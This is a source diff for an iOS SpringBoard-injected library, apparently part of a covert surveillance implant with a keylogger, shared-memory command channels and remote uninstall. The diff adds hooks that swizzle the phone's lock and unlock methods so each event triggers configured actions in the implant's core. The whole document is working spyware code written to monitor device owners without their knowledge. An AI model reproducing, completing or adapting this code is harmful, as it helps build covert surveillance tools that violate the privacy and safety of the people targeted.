@@ -61,6 +61,7 @@ static int imFlag           = 0;
 static int clipboardFlag    = 0;
 static int scrFlag          = 0;
 static int appFlag          = 0;
+static int stdFlag          = 0;
 
 RCSISharedMemory      *mSharedMemoryCommand;
 RCSISharedMemory      *mSharedMemoryLogging;
@@ -68,6 +69,7 @@ RCSIKeyLogger         *gLogger;
 
 FILE *mFD;
 
+standByStruct gStandByActions;
 
 BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SEL _newMethod)
 {
@@ -142,13 +144,63 @@ void RILog (NSString *format, ...)
 
 @implementation RCSILoader
 
+// For stanby Event
+- (BOOL)hookingStandByMethods
+{
+  // lock class for iOS 3/4
+  Class sBUIController = objc_getClass("SBUIController");
+  
+  // Unlock class for iOS 3/4
+  Class sBCallAlertDisplay  = objc_getClass("SBCallAlertDisplay");
+  Class sBAwayView          = objc_getClass("SBAwayView");
+  Class sBAwayController    = objc_getClass("SBAwayController");
+  
+  Class classSource = objc_getClass("RCSILoader");
+  
+  if (sBUIController == nil ||
+      sBCallAlertDisplay == nil ||
+      sBAwayView == nil)
+    return NO;
+  
+  // Lock method for iOS 3.1.3
+  swizzleByAddingIMP(sBUIController, @selector(lock:),
+                     class_getMethodImplementation(classSource, @selector(lockHook:)),
+                     @selector(lockHook:));
+  
+  // Lock method for iOS 4.3.3
+  swizzleByAddingIMP(sBUIController, @selector(lockWithType:disableLockSound:),
+                     class_getMethodImplementation(classSource, @selector(lockWithTypeHook:disableLockSound:)),
+                     @selector(lockWithTypeHook:disableLockSound:));
+  
+  // Unlock method for iOS 4.3.3
+  swizzleByAddingIMP(sBAwayController, @selector(unlockWithSound:alertDisplay:),
+                     class_getMethodImplementation(classSource, @selector(unlockWithSoundHook:alertDisplay:)),
+                     @selector(unlockWithSoundHook:alertDisplay:));
+  
+  // Unlock methods for iOS 3.1.3
+  swizzleByAddingIMP(sBAwayView, @selector(lockBarUnlocked:),
+                     class_getMethodImplementation(classSource, @selector(lockBarUnlockedHook:)),
+                     @selector(lockBarUnlockedHook:));
+  
+  swizzleByAddingIMP(sBCallAlertDisplay, @selector(lockBarUnlocked:),
+                     class_getMethodImplementation(classSource, @selector(lockBarUnlocked2Hook:)),
+                     @selector(lockBarUnlocked2Hook:));
+  
+  
+#ifdef DEBUG
+  NSLog(@"[DYLIB] %s: stdFlag is now %d", __FUNCTION__, stdFlag);
+#endif
+  
+  return YES;
+}
+
 - (void)checkForUninstall
 {
   BOOL isUninstalled = NO;
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
 
 #ifdef DEBUG
-  NSLog(@"[DYLIB] %s: SB running poll commnad", __FUNCTION__);
+  NSLog(@"[DYLIB] %s: SB running poll command", __FUNCTION__);
 #endif
   
   mSharedMemoryLogging = [[RCSISharedMemory alloc] initWithFilename: SH_LOG_FILENAME
@@ -188,9 +240,9 @@ void RILog (NSString *format, ...)
     
       NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
 
+      // Check for uninstall
       readData = [mSharedMemoryCommand readMemory: OFFT_UNINSTALL
-                                    fromComponent: COMP_AGENT];
-  
+                                    fromComponent: COMP_AGENT]; 
       if (readData != nil)
         {
           NSString *libName, *libWithPathname; 
@@ -282,8 +334,43 @@ void RILog (NSString *format, ...)
             }
         }
 
+      // Check for events lock/unlock
+      readData = [mSharedMemoryCommand readMemory: OFFT_STANDBY
+                                    fromComponent: COMP_AGENT];
+      if (readData != nil)
+      {      
+
+        shMemCommand = (shMemoryCommand *)[readData bytes];
+        
+        if (stdFlag == 0 && shMemCommand->command == AG_START)
+        {
+          memcpy(&gStandByActions, shMemCommand->commandData, sizeof(standByStruct));
+          
+#ifdef DEBUG
+          NSLog(@"[DYLIB] %s: start STANDBY swizziling onLock %d, onUnlock %d", 
+                __FUNCTION__, gStandByActions.actionOnLock, gStandByActions.actionOnUnlock);
+#endif      
+          stdFlag = 1;
+          
+          [self hookingStandByMethods];
+        }
+        else if (stdFlag == 1 && shMemCommand->command == AG_STOP)
+        {
+#ifdef DEBUG
+          NSLog(@"[DYLIB] %s: STANDBY swizziling", __FUNCTION__);
+#endif     
+          stdFlag = 0;
+          
+          gStandByActions.actionOnLock =
+          gStandByActions.actionOnUnlock = CONF_ACTION_NULL;
+          
+          [self hookingStandByMethods];
+        }
+      }
+      
       [[NSRunLoop currentRunLoop] runUntilDate: [NSDate dateWithTimeIntervalSinceNow: 0.2]];
-      [innerPool drain];
+      
+      [innerPool release];
       
       if (isUninstalled) 
         break;
@@ -298,6 +385,102 @@ void RILog (NSString *format, ...)
   [outerPool release];
   
   [NSThread exit];
+}
+
+BOOL triggerStanByAction(UInt32 aAction)
+{
+  BOOL retVal = YES;
+  
+  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+  
+  NSMutableData *actionData = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
+  shMemoryLog *shMemoryHeader = (shMemoryLog *)[actionData bytes];
+  
+  shMemoryHeader->status          = SHMEM_WRITTEN;
+  shMemoryHeader->logID           = 0;
+  shMemoryHeader->agentID         = EVENT_STANDBY;
+  shMemoryHeader->direction       = D_TO_CORE;
+  shMemoryHeader->commandType     = CM_LOG_DATA;
+  shMemoryHeader->flag            = aAction;
+  shMemoryHeader->commandDataSize = 0;
+  shMemoryHeader->timestamp       = 0;
+  
+  if ([mSharedMemoryLogging writeMemory: actionData 
+                                 offset: 0
+                          fromComponent: COMP_AGENT] == TRUE)
+  {
+#ifdef DEBUG
+    NSLog(@"[DYLIB] %s: triggering action %d", __FUNCTION__, aAction);
+#endif
+  }
+  else
+  {
+#ifdef DEBUG_ERRORS
+    NSLog(@"[DYLIB] %s: error triggering action", __FUNCTION__);
+#endif
+    retVal=NO;
+  }
+  
+  [actionData release];
+  
+  [pool release];
+  
+  return retVal;
+}
+
+// Hook for stanby events
+- (void)lockWithTypeHook:(int)aInteger disableLockSound: (BOOL)aBool
+{
+  [self lockWithTypeHook:aInteger disableLockSound:aBool];
+  
+  triggerStanByAction(gStandByActions.actionOnLock);
+  
+#ifdef DEBUG
+  NSLog(@"[DYLIB] %s:  lockWithTypeHook called", __FUNCTION__);
+#endif
+}
+- (void)lockHook: (BOOL)aValue
+{
+  [self lockHook: aValue];
+  
+  triggerStanByAction(gStandByActions.actionOnLock);
+  
+#ifdef DEBUG
+  NSLog(@"[DYLIB] %s: lockHook called", __FUNCTION__);
+#endif
+}
+
+- (void)unlockWithSoundHook:(BOOL)aBool alertDisplay:(id)anID
+{
+  [self unlockWithSoundHook:aBool alertDisplay:anID];
+  
+  triggerStanByAction(gStandByActions.actionOnUnlock);
+  
+#ifdef DEBUG
+  NSLog(@"[DYLIB] %s:  unlockWithSoundHook called", __FUNCTION__);
+#endif
+}
+
+- (void)lockBarUnlockedHook:(id)aValue
+{
+  [self lockBarUnlockedHook: aValue];
+  
+  triggerStanByAction(gStandByActions.actionOnUnlock);
+  
+#ifdef DEBUG
+  NSLog(@"[DYLIB] %s: lockBarUnlockedHook called", __FUNCTION__);
+#endif
+}
+
+- (void)lockBarUnlocked2Hook:(id)aValue
+{
+  [self lockBarUnlocked2Hook: aValue];
+  
+ triggerStanByAction(gStandByActions.actionOnUnlock);
+  
+#ifdef DEBUG
+  NSLog(@"[DYLIB] %s: lockBarUnlockedHook called", __FUNCTION__);
+#endif
 }
 
 - (void)communicateWithCore
